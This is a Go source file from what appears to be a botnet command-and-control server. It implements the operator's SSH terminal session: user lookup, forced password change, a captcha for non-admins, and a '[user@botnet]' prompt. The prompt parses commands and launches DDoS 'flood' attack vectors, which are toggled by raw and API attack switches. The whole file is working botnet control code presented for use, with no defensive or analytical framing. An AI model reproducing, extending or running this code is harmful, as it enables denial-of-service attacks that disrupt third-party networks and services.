package views

import (
	"cnc/internal"
	"cnc/internal/clients"
	"cnc/internal/database"
	"cnc/internal/master/command"
	"cnc/internal/master/floods"
	"cnc/internal/master/models/themes"
	"cnc/internal/master/sessions"
	"cnc/pkg/logging"
	"cnc/pkg/sshd"
	"errors"
	"fmt"
	"github.com/gdamore/tcell/v2"
	"github.com/mattn/go-shellwords"
	"strings"
	"time"

	"github.com/rivo/tview"
)

func Init() {
	theme := tview.Theme{
		PrimitiveBackgroundColor:    tcell.ColorDefault,
		ContrastBackgroundColor:     tcell.ColorDefault,
		MoreContrastBackgroundColor: tcell.ColorDefault,
		BorderColor:                 tcell.ColorDefault,
		TitleColor:                  tcell.ColorDefault,
		GraphicsColor:               tcell.ColorDefault,
		PrimaryTextColor:            tcell.ColorDefault,
		SecondaryTextColor:          tcell.ColorDefault,
		TertiaryTextColor:           tcell.ColorDefault,
		InverseTextColor:            tcell.ColorDefault,
		ContrastSecondaryTextColor:  tcell.ColorDefault,
	}

	tview.Styles = theme
}

func Prompt(t *sshd.Terminal) {
	Init()

	var cancel = make(chan struct{})

	// add defer
	defer func() {
		cancel <- struct{}{}

		err := t.Close()
		if err != nil {
			return
		}
	}()

	// retrieve user from database
	info, err := database.User.SelectByUsername(t.Conn.Name())
	if err != nil {
		logging.Global.Error().
			Err(err).
			Msg("An unexpected error occurred")
		return
	}

	// if theme doesn't exist. set it to default which should ALWAYS exist.
	theme, ok := themes.List[info.Theme]
	if !ok {
		info.Theme = "default"
		theme = themes.List[info.Theme]
	}

	// session info
	session := sessions.New(&sessions.Session{
		Terminal:         t,
		Created:          time.Now(),
		LastDistribution: clients.Distribution(),
		UserProfile:      info,
		Theme:            theme,
	})

	if err = ForcePwChange(session); err != nil {
		return
	}

	if !session.HasRole("admin") {
		Captcha(t, session)
	}

	// run title worker
	go titleWorker(session, cancel)

	// clear screen and set prompt
	_ = session.Clear()
	_ = session.ExecuteBranding(nil, "banner.tfx")

	t.Terminal.AutoCompleteCallback = command.NewCompleter(session.UserProfile).AutoComplete

	for {
		prom, err := session.ExecuteBrandingToString(nil, "prompt.tfx")
		if err != nil {
			logging.Global.
				Err(err).
				Str("user", session.Name).
				Msg("Error occurred while handling user")

			prom = fmt.Sprintf("[%s@botnet] ", session.Name)
		}

		t.Terminal.SetPrompt(prom)

		literal, err := t.Terminal.ReadLine()
		if err != nil {
			return
		}

		// parse stuff
		envs, args, err := shellwords.ParseWithEnvs(literal)
		if len(args) == 0 || err != nil {
			continue
		}

		// funny and silly
		if strings.HasPrefix(args[0], "!") || strings.HasPrefix(args[0], ".") || strings.HasPrefix(args[0], "@") || strings.HasPrefix(args[0], "#") || strings.HasPrefix(args[0], "$") {
			args[0] = args[0][1:]
		}

		// get vector from vector list and handle it
		vector, ok := floods.VectorList[args[0]]
		if ok {
			if (!vector.API && !internal.RawAttacksEnabled) || (vector.API && !internal.ApiAttacksEnabled) {
				_ = session.Notification("Attacks are currently disabled.")
				continue
			}

			if err := vector.Handle(session, args[0], args[1:]...); err != nil {
				continue
			}

			continue
		}

		// command parsing and execution
		parent, cmd, index, err := command.Parse(session.UserProfile, args...)
		if err != nil {
			if errors.Is(err, command.ErrCommandNotRegistered) {
				_ = session.Printfln("\x1b[91mbad command name: \"%s\"\x1b[0m", literal)
				continue
			}

			_ = session.Printfln("\x1b[91m%s\x1b[0m", err.Error())
			continue
		}

		// create a new command context aka. argument parser
		context, err := command.NewContext(parent, cmd, envs, args[index:]...)
		if err != nil {
			_ = session.Printfln("\x1b[91mcommand fail: \"%s\"\x1b[0m", err.Error())
			continue
		}

		// execute command
		if err := cmd.Executor(session, context); err != nil {
			_ = session.Printfln("\x1b[91mcommand fail: \"%s\"\x1b[0m", err.Error())
			continue
		}
	}
}
